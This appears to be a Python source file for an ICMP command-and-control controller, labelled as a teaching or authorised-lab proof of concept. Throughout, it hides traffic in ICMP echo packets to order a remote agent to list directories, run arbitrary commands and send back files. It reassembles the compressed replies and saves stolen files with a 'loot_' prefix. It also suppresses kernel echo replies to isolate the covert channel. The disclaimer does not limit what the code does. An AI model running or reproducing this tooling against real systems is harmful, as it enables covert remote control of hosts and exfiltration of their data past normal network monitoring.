#!/usr/bin/env python3
"""
controller.py — ICMP C2 controller (teaching / authorised-lab PoC).

zlib-chunked streams over ICMP type 8 (CMD! START/CHUNK/END), RETRY/ACK,
source-IP filter, busy lock. Menu runs off the sniff path.
"""

from __future__ import annotations

import argparse
import atexit
import os
import subprocess
import sys
import threading
import zlib

from scapy.all import ICMP, IP, Raw, send, sniff

TRIGGER_MARKER = b"CMD!"

TARGET_IP = ""
IFACE = ""

received_chunks: dict = {}
current_filename = b""
expected_max_seq = 0
stream_lock = threading.Lock()
stream_busy = False


def toggle_kernel_icmp(state: str) -> None:
    try:
        subprocess.run(
            ["sysctl", "-w", f"net.ipv4.icmp_echo_ignore_all={state}"],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        status = "DISABLED (channel isolated)" if state == "1" else "RESTORED"
        print(f"[*] Kernel ICMP echo replies: {status}.")
    except Exception as e:
        print(f"[-] Warning: could not adjust icmp_echo_ignore_all: {e}")


def restore_kernel_icmp() -> None:
    toggle_kernel_icmp("0")


def shutdown_sequence() -> None:
    print("\n[*] Restoring kernel ICMP and exiting...")
    restore_kernel_icmp()
    print("[+] Done.")
    os._exit(0)


def send_trigger(cmd_string: str) -> None:
    pkt = (
        IP(dst=TARGET_IP)
        / ICMP(type=8, id=0xC200)
        / Raw(load=TRIGGER_MARKER + cmd_string.encode())
    )
    send(pkt, iface=IFACE, verbose=False)


def packet_handler(packet) -> None:
    global received_chunks, current_filename, expected_max_seq, stream_busy

    if not packet.haslayer(IP) or not packet.haslayer(Raw):
        return
    if packet[IP].src != TARGET_IP:
        return

    raw_load = packet[Raw].load
    if TRIGGER_MARKER not in raw_load:
        return

    idx = raw_load.find(TRIGGER_MARKER)
    data = raw_load[idx + len(TRIGGER_MARKER) :]

    if data.startswith(b"[START]"):
        try:
            meta, name = data[7:].split(b"|", 1)
            with stream_lock:
                expected_max_seq = int(meta.decode())
                current_filename = name
                received_chunks = {}
                stream_busy = True
            print(
                f"\n[+] Stream start: {current_filename.decode(errors='ignore')} "
                f"({expected_max_seq} frames)"
            )
        except Exception as e:
            print(f"\n[-] Bad START frame: {e}")
        return

    if data.startswith(b"[CHUNK]"):
        if not packet.haslayer(ICMP):
            return
        seq_id = int(packet[ICMP].seq)
        with stream_lock:
            if not stream_busy:
                return
            received_chunks[seq_id] = data[7:]
        sys.stdout.write(".")
        sys.stdout.flush()
        return

    if data.startswith(b"[END]"):
        with stream_lock:
            if not stream_busy:
                return
            missing = [i for i in range(expected_max_seq) if i not in received_chunks]
            filename = current_filename
            max_seq = expected_max_seq
            chunks_snapshot = dict(received_chunks)

        if missing:
            retry_string = ",".join(str(i) for i in missing)
            print(f"\n[!] Missing frames {retry_string}; requesting RETRY")
            send_trigger(f"RETRY|{retry_string}")
            return

        print("\n[+] Stream complete; decompressing...")
        try:
            compressed = b"".join(chunks_snapshot[i] for i in range(max_seq))
            original = zlib.decompress(compressed)
            if filename in (b"ls_output.txt", b"command_log.txt"):
                print(f"\n[Agent output]:\n\n{original.decode('utf-8', errors='ignore')}\n")
            else:
                out_name = f"loot_{filename.decode(errors='ignore')}"
                with open(out_name, "wb") as f:
                    f.write(original)
                print(f"\n[+] Wrote '{out_name}' ({len(original)} bytes)")
            send_trigger("ACK|DONE")
        except Exception as e:
            print(f"[-] Decompress failed: {e}")
        finally:
            with stream_lock:
                stream_busy = False
                received_chunks = {}
                current_filename = b""
                expected_max_seq = 0


def background_sniffer() -> None:
    sniff(iface=IFACE, filter="icmp", prn=packet_handler, store=0)


def parse_args():
    ap = argparse.ArgumentParser(
        description="ICMP C2 controller — authorised lab / coursework only."
    )
    ap.add_argument(
        "--target",
        default=os.environ.get("ICMP_C2_TARGET"),
        help="Agent IP (or env ICMP_C2_TARGET)",
    )
    ap.add_argument(
        "--iface",
        default=os.environ.get("ICMP_C2_IFACE"),
        help="Sniff/send interface, e.g. vboxnet1 or ens5 (or env ICMP_C2_IFACE)",
    )
    return ap.parse_args()


def main() -> None:
    global TARGET_IP, IFACE

    if os.geteuid() != 0:
        sys.exit("[-] Needs root (sudo).")

    args = parse_args()
    if not args.target or not args.iface:
        sys.exit(
            "[-] Set --target and --iface (or ICMP_C2_TARGET / ICMP_C2_IFACE). "
            "No baked-in lab defaults."
        )
    TARGET_IP = args.target
    IFACE = args.iface

    toggle_kernel_icmp("1")
    atexit.register(restore_kernel_icmp)

    threading.Thread(target=background_sniffer, daemon=True).start()
    print(f"[+] Sniffing ICMP on {IFACE}; target {TARGET_IP}")

    while True:
        try:
            print("\n=== ICMP C2 lab menu ===")
            print("1: List Directory (ls) | 2: Run Command | 3: Fetch File | 4: Exit & Restore")
            choice = input("> ").strip()

            if choice == "4":
                shutdown_sequence()

            if choice not in ("1", "2", "3"):
                continue

            with stream_lock:
                busy = stream_busy
            if busy:
                print("[!] Stream still in progress; wait for it to finish.")
                continue

            argument = input("Parameter/path: ").strip()
            if choice == "1":
                send_trigger(f"LS|{argument or '.'}")
            elif choice == "2":
                if not argument:
                    print("[-] Need a command.")
                    continue
                send_trigger(f"RUN|{argument}")
            elif choice == "3":
                if not argument:
                    print("[-] Need a path.")
                    continue
                send_trigger(f"SEND|{argument}")
        except (KeyboardInterrupt, SystemExit):
            shutdown_sequence()


if __name__ == "__main__":
    main()
